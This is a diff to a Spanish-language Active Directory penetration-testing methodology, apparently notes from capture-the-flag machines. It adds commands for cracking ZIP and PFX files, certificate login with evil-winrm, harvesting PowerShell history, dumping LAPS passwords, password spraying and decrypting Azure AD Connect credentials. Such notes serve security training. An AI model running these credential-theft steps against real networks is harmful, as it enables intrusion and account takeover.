@@ -306,6 +306,100 @@ hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt -o cracked
 
 ---
 
+## FASE 5b — Credenciales en archivos comprimidos/certificados (ZIP, PFX)
+
+Caso real completo (máquina Timelapse). A veces un share SMB tiene un `.zip` protegido con password, y dentro un archivo `.pfx` (certificado + clave privada) que **también** está protegido con su propia password — dos capas de cracking antes de poder usar nada.
+
+```bash
+# 1. Crackear el ZIP
+zip2john archivo.zip > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt    # o: cat ~/.john/john.pot
+
+unzip archivo.zip
+# te pedirá la password que acabas de crackear
+```
+
+```bash
+# 2. Un .pfx (certificado personal, formato PKCS#12) suele tener SU PROPIA password
+pfx2john archivo.pfx > pfx_hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=pfx pfx_hash.txt
+john --show --format=pfx pfx_hash.txt
+```
+
+### Convertir el PFX en cert + key para usarlo con evil-winrm
+
+Un `.pfx` contiene certificado Y clave privada juntos — para autenticar con evil-winrm necesitas **separarlos** en dos archivos:
+
+```bash
+# Extrae la clave privada (key.pem) — necesitas la password del pfx que ya crackeaste
+openssl pkcs12 -in archivo.pfx -nocerts -out key.pem -nodes
+# Te pedirá la "Import Password" → es la password del pfx (ej: "thuglegacy")
+
+# Extrae el certificado (cert.pem) — misma password
+openssl pkcs12 -in archivo.pfx -clcerts -nokeys -out cert.pem
+```
+> `-nodes` en el primer comando = no cifrar la clave privada de salida (para no tener que meter otra password extra al usarla). `-nocerts`/`-clcerts` es lo que separa cert de key.
+
+### Conectar con evil-winrm usando certificado (autenticación de cliente TLS, no usuario/password)
+
+```bash
+evil-winrm -i <IP> -c cert.pem -k key.pem -S
+```
+- `-c` → el certificado
+- `-k` → la clave privada
+- `-S` → SSL (este tipo de auth por certificado casi siempre corre sobre WinRM+TLS, puerto 5986)
+
+**Esto autentica como el usuario al que pertenece ese certificado** (en el caso real, `legacyy`) — no necesitas su password en texto plano en absoluto, el certificado ES la credencial.
+
+---
+
+## FASE 5c — Credenciales en el historial de PowerShell (post-explotación, "qué hacer una vez dentro")
+
+Una vez con shell, antes de pasar a winPEAS automatizado, revisa manualmente el historial de comandos del usuario — a veces alguien escribió una password en texto plano sin querer dejarla ahí:
+
+```powershell
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+Busca líneas con `ConvertTo-SecureString`, `PSCredential`, o cualquier password/usuario visible. Es un archivo que PowerShell mantiene automáticamente con cada comando que el usuario tecleó en sesiones anteriores — muy común encontrar ahí credenciales de otra cuenta usadas para pruebas.
+
+---
+
+## FASE 5d — LAPS (Local Administrator Password Solution)
+
+**Qué es:** Microsoft LAPS asigna una password de Administrador **local** distinta y rotada automáticamente a cada máquina del dominio, guardándola cifrada en un atributo de AD (`ms-Mcs-AdmPwd` en la versión clásica). Si tu usuario tiene permiso de lectura sobre ese atributo, LAPS te da esa password en texto plano — no es una vulnerabilidad de LAPS en sí, es un permiso de lectura mal otorgado.
+
+```bash
+# Forma más rápida y directa — módulo dedicado de nxc
+nxc ldap <IP> -u '<user>' -p '<pass>' -M laps
+# Output: Computer:<HOSTNAME>$ User: Password:<password_texto_plano>
+```
+
+**Alternativas si `nxc -M laps` no está disponible:**
+```powershell
+# Desde una shell de Windows, con PowerShell nativo (necesita el módulo AD o RSAT)
+Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
+# Busca en el output: ms-Mcs-AdmPwd (la password) y ms-Mcs-AdmPwdExpirationTime
+```
+```bash
+# O vía LDAP directo
+ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=computer)" ms-Mcs-AdmPwd -LLL
+```
+
+**Con la password de LAPS obtenida — es del Administrador LOCAL de esa máquina específica, no del dominio:**
+```bash
+evil-winrm -i <IP> -u 'Administrator' -p '<password_de_laps>' -S
+```
+
+> **Con shell de Administrator, ya tienes acceso a TODO el sistema de archivos** — no necesitas "las credenciales de" ningún otro usuario para leer su flag. Simplemente navega a su carpeta:
+> ```powershell
+> dir C:\Users\<otro_usuario>\Desktop
+> type C:\Users\<otro_usuario>\Desktop\root.txt
+> ```
+> No confundas "la flag está en el Desktop de X" con "necesito loguearme como X" — Administrator puede leer cualquier carpeta del sistema sin importar de quién sea.
+
+---
+
 ## FASE 6 — Movimiento lateral
 
 ```bash
@@ -495,6 +589,70 @@ impacket-secretsdump -just-dc <dominio>/<user>:<pass>@<DC_IP>
 
 ---
 
+## FASE 8b — Vector alternativo: Azure AD Connect / ADSync (cuando NO hay DCSync ni cadena ACL)
+
+Caso real completo (máquina Monteverde). Si tu usuario no tiene ningún edge útil hacia Domain Admin en BloodHound, pero SÍ tiene acceso a una máquina que corre **Azure AD Connect** (sincroniza el AD on-prem con Azure AD), esa máquina guarda credenciales de una cuenta MSOL con privilegios altos, **descifrables** por diseño — es un vector documentado (metodología de Xpnsec/adconnectdump).
+
+### Cómo llegar hasta ahí
+
+```bash
+# 1. Password spraying probando usuario = password (común en cuentas de servicio
+#    mal configuradas, vale la pena probarlo siempre junto al spray normal)
+nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
+# o generando un archivo de passwords idéntico a la lista de usuarios:
+cp users.txt passwords_as_users.txt
+nxc smb <IP> -u users.txt -p passwords_as_users.txt
+```
+
+```bash
+# 2. Con la credencial que funcione, revisa shares — busca archivos .xml
+#    (Azure AD Connect a veces deja exports de PowerShell con credenciales
+#    en texto plano, tipo PSADPasswordCredential)
+smbclient //<IP>/<share_con_READ> -U '<user>'
+#   cd <carpeta_de_usuario> ; ls ; get archivo.xml
+
+cat archivo.xml
+# Busca <S N="Password">...</S> — a veces está literalmente en texto plano
+# dentro de un objeto serializado de PowerShell (PSADPasswordCredential).
+```
+
+### Confirmar que la máquina corre Azure AD Connect
+
+Una vez con shell (evil-winrm) en la máquina que tiene el servicio:
+```powershell
+Test-Path "C:\Program Files\Microsoft Azure AD Sync\"
+Get-Service -Name ADSync
+# Si "Running", la base de datos LocalDB del sync está activa.
+```
+
+### Extraer y descifrar las credenciales de la cuenta de sync
+
+Azure AD Connect guarda en una base LocalDB (`ADSync`) las credenciales, cifradas con una clave que la propia máquina puede leer (por diseño, ya que necesita descifrarlas para operar). Herramientas como `AdDecrypt.exe`/scripts equivalentes automatizan esto:
+
+```bash
+# Sube el script/binario de descifrado a la máquina (mismo método que winPEAS: Fase 7)
+# Ejemplo real de script usado: decrypt.ps1 (ajusta la data source si el primer intento falla)
+```
+```powershell
+.\decrypt.ps1
+# Si falla contra "(localdb)\.\ADSync", puede necesitar la data source alternativa
+# "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True" — el script
+# suele intentar varias rutas de conexión automáticamente.
+```
+
+**Resultado esperado:** el script te devuelve directamente el usuario y password en texto plano de la cuenta que Azure AD Connect usa para sincronizar — típicamente `Administrator` o una cuenta de servicio con privilegios de dominio equivalentes:
+```
+Domain: <DOMINIO>
+Username: administrator
+Password: <PASSWORD_EN_TEXTO_PLANO>
+```
+
+Con eso, salta directo a Fase 9 (Pass-the-Hash o login directo con la password).
+
+> **Cuándo pensar en este vector:** si enumeraste el dominio completo, corriste BloodHound, y no hay ningún edge útil (ni ACL, ni Kerberoastable jugoso, ni sesión aprovechable) — pero SÍ ves `Azure Admins` como grupo del dominio, o encuentras rutas/archivos que mencionen "Azure AD Sync" o "AAD_" en nombres de cuenta (como `AAD_987d7f2f57d2`, un patrón típico de cuenta de sincronización) — es una señal fuerte de que Azure AD Connect está en juego, y vale la pena buscar la máquina que lo corre.
+
+---
+
 ## FASE 9 — Pass-the-Hash final y captura de flags
 
 ```bash
@@ -523,18 +681,24 @@ type tmp.hex
 nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
    → enumeración SIN creds (null session, RPC anónimo, shares, WEB si hay puerto 80)
    → ¿GPP/Groups.xml? → gpp-decrypt → credencial #1
+   → ¿ZIP/PFX en un share? → zip2john/pfx2john + john → openssl extrae cert+key
+     → evil-winrm -c cert.pem -k key.pem -S (autenticación por certificado)
    → enumeración CON creds (nxc, LDAP con filtros, RPC — CRUZA AMBAS fuentes)
    → BloodHound (verificar arranque con pg_lsclusters si no responde)
    → priorizar camino: ACL > Kerberos > Sesión
    → ejecutar técnica del camino elegido → nueva credencial/acceso
-   → movimiento lateral (evil-winrm/psexec/wmiexec — confirmar puerto primero)
+   → movimiento lateral (evil-winrm/psexec/wmiexec — confirmar puerto Y si es 5986 usar -S)
    → si WinRM autoriza mal: sospechar grupo "Remote Management Users"
+   → revisar ConsoleHost_history.txt (PowerShell) — a veces hay password en texto plano
    → winPEAS (servir desde carpeta correcta, IP de VPN, convertir UTF-16→UTF-8 antes de grep)
    → ¿autologin encontrado? CRUZAR contra directorios reales en C:\Users (nombre puede diferir)
    → repetir BloodHound con el nuevo usuario si hace falta
    → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify + dacledit)
-   → Pass-the-Hash al DC con el hash del Administrator
-   → flags (user.txt / root.txt / proof.txt)
+   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps) o Azure AD Connect
+     (grupo "Azure Admins", cuentas AAD_*, servicio ADSync corriendo)
+   → Pass-the-Hash al DC (o password de LAPS) con el hash/pass del Administrator
+   → flags (user.txt / root.txt / proof.txt) — Administrator lee CUALQUIER carpeta,
+     no necesitas ser el usuario dueño de la flag
 ```
 
 ## Checklist mental de "cuando algo no funciona" (aplica en CUALQUIER fase)
@@ -545,3 +709,6 @@ nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
 4. **¿grep no encuentra nada en un archivo que "debería" tenerlo?** → revisa el encoding con `file archivo.txt` (busca UTF-16 de PowerShell) y conviértelo con `iconv` primero.
 5. **¿WinRM conecta pero no ejecuta nada?** → autenticación ok, autorización no — el usuario no está en "Remote Management Users". Cambia de protocolo (SMB/psexec/wmiexec).
 6. **¿Ninguna variante de conexión funciona con un usuario "confirmado"?** → cruza el nombre contra otra fuente (directorio real en `C:\Users`, lista de RPC vs LDAP) — el dato de origen puede estar mal o desactualizado.
+7. **¿BloodHound no muestra NINGÚN camino útil a Domain Admin?** → antes de rendirte, revisa shares en busca de archivos `.xml`/`.config`/`.zip`/`.pfx` con credenciales filtradas, y busca indicios de Azure AD Connect (grupo "Azure Admins", cuentas `AAD_*`, servicio `ADSync`) o de LAPS (`nxc ldap -M laps`) — no todo pasa por ACLs o Kerberos.
+8. **¿WinRM da `ConnectTimeoutError` o similar al conectar?** → antes de asumir que es un problema de red, confirma qué puerto está REALMENTE abierto (`nmap -p5985,5986 <IP>`). Si es 5986 en vez de 5985, agrega `-S` (SSL) al comando de evil-winrm.
+9. **¿Tienes shell de Administrator pero la flag "no existe" en la ruta que probaste?** → Administrator puede leer la carpeta de CUALQUIER usuario del sistema, la flag no tiene que estar en `C:\Users\Administrator\` — revisa `dir C:\Users` para ver qué otras cuentas existen y busca ahí.
